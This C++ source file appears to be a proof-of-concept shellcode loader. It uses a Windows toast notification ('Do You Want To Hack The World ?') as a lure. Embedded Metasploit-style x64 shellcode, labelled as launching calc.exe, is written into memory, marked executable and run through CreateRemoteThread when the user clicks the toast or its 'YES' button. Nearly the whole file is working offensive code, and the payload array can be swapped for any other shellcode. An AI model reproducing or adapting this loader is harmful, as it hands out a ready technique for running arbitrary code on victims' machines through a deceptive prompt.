#include "wintoastlib.h"
#include "helper.h"
using namespace WinToastLib;

typedef struct MyStruct {
	PVOID pShellcode;
	SIZE_T ShellcodeSize;
	HANDLE hProcess;
};

MyStruct PayloadData = { 0 };


BOOL RunShell(HANDLE hProcess, PVOID BaseAddress, SIZE_T SizeOfShellcode);

class CustomHandler : public IWinToastHandler {
public:
	void toastActivated() const {
		//std::wcout << L"The user clicked in this toast" << std::endl; // normal click here
		MessageBoxA(NULL, "WE WILL TAKE THIS AS A YES", "THANKS", MB_OK);
		if (PayloadData.pShellcode != NULL && PayloadData.hProcess != NULL && PayloadData.ShellcodeSize != NULL) {
			RunShell(PayloadData.hProcess, PayloadData.pShellcode, PayloadData.ShellcodeSize);
		}
		exit(0);
	}

	void toastActivated(int actionIndex) const {
		//std::wcout << L"The user clicked on action #" << actionIndex << std::endl; // click in action, based on the initialization, my example has yes before nope so yes:0 nope:1
		if (actionIndex == 1){
			MessageBoxA(NULL, "BUT WHY I THOUGHT U WERE COOL !?", "WHYYYY", MB_OKCANCEL);
		}
		else{
			if (PayloadData.pShellcode != NULL && PayloadData.hProcess != NULL && PayloadData.ShellcodeSize != NULL) {
				RunShell(PayloadData.hProcess, PayloadData.pShellcode, PayloadData.ShellcodeSize);
			}
		}
		exit(16 + actionIndex);
	}

	void toastDismissed(WinToastDismissalReason state) const {
		switch (state) {
		case UserCanceled:
			std::wcout << L"The user dismissed this toast" << std::endl;
			exit(1);
			break;
		case TimedOut:
			std::wcout << L"The toast has timed out" << std::endl;
			exit(2);
			break;
		case ApplicationHidden:
			std::wcout << L"The application hid the toast using ToastNotifier.hide()" << std::endl;
			exit(3);
			break;
		default:
			std::wcout << L"Toast not activated" << std::endl;
			exit(4);
			break;
		}
	}

	void toastFailed() const {
		std::wcout << L"Error showing current toast" << std::endl;
		exit(5);
	}
};

// 272 bytes -- meterpreter x64 calc.exe shellcode --
unsigned char rawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL RunShell(HANDLE hProcess, PVOID BaseAddress, SIZE_T SizeOfShellcode) {
	SIZE_T lpNumberOfBytesWritten;
	HANDLE hThread;
	DWORD  Old, ThreadId;
	printf("[+] Based address Of The Shellcode Is 0x%0-16p\n", BaseAddress);
	if (WriteProcessMemory(hProcess, BaseAddress, rawData, SizeOfShellcode, &lpNumberOfBytesWritten)) {
		printf("[+] WROTE : %ld bytes\n", lpNumberOfBytesWritten);
		if (!VirtualProtectEx(hProcess, BaseAddress, SizeOfShellcode, PAGE_EXECUTE_READWRITE, &Old)) {
			printf("[!] VirtualProtectEx Failed to Map Mem To RWX [ ERR0R: %d ]\n", GetLastError());
			return FALSE;
		}
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, NULL, &ThreadId);
		if (!hThread){
			printf("[!] Failed to Run The Thread [ ERR0R: %d ]\n", GetLastError());
			return FALSE;
		}
		printf("[+] A Thread Running Our Shellcode With Id : %d \n", ThreadId);
		WaitForSingleObject(hThread, INFINITE);
		return TRUE;
	}
	else {
		printf("[!] Failed to Write The Shellcode [ ERR0R: %d ]\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

int main() {
	LPVOID BaseAddress = NULL;
	HANDLE hProcess = GetCurrentProcess();
	SIZE_T SizeOfShellcode = sizeof(rawData);
	BaseAddress = VirtualAllocEx(hProcess, NULL, SizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!BaseAddress) {
		printf("[!] Failed to Allocate RW Mem [ ERR0R: %d ]\n", GetLastError());
		return -1;
	}
	if (BaseAddress != NULL && hProcess != NULL && SizeOfShellcode != NULL){
		PayloadData.hProcess = hProcess;
		PayloadData.pShellcode = BaseAddress;
		PayloadData.ShellcodeSize = SizeOfShellcode;
	}

	if (!WinToast::isCompatible()) {
		std::wcerr << L"Error, your system in not supported!" << std::endl;
		return Results::SystemNotSupported;
	}

	WinToastTemplate templ(WinToastTemplate::ImageAndText02);
	WinToastTemplate::AudioOption audioOption = WinToastTemplate::AudioOption::Default;
	INT64 expiration = 10000;

	WinToast::instance()->setAppName(L"TOASTER");
	WinToast::instance()->setAppUserModelId(L"OOPS");
	if (!WinToast::instance()->initialize()) {
		std::wcerr << L"Error 2, your system in not compatible!" << std::endl;
		return Results::InitializationFailure;
	}
	templ.setTextField(L"Do You Want To Hack The World ?", WinToastTemplate::FirstLine);
	templ.setAudioOption(audioOption);
	templ.addAction(L"YES");
	templ.addAction(L"NOPE");
	templ.setExpiration(expiration);
	templ.setImagePath(L"full \\path\\ to: ...\\Toaster\\Toaster\\image.jpg"); //update the path here :)


	if (WinToast::instance()->showToast(templ, new CustomHandler()) < 0) {
		std::wcerr << L"Could not launch your toast notification!";
		return Results::ToastFailed;
	}
	// Give the handler a chance for 15 seconds (or the expiration plus 1 second)
	Sleep(expiration ? (DWORD)expiration + 1000 : 15000);

	exit(2);

	return 0;
}